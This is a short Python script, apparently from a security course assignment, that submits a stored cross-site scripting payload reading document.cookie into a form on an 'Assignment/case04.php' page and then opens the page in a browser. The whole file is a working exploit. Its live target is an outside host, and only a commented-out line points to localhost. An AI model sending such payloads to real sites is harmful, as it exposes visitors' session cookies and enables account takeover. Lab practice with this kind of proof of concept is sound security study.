from urllib import request, parse
import webbrowser

# base_url = "http://localhost:20080/Assignment/case04.php"
base_url = "http://iu.ru/Assignment/case04.php"
values = {"title": "title", "content": "<script>alert(document.cookie)</script>"}
data = parse.urlencode(values).encode()
req = request.Request(base_url, data=data)
resp = request.urlopen(req)

webbrowser.open(base_url, new=2)
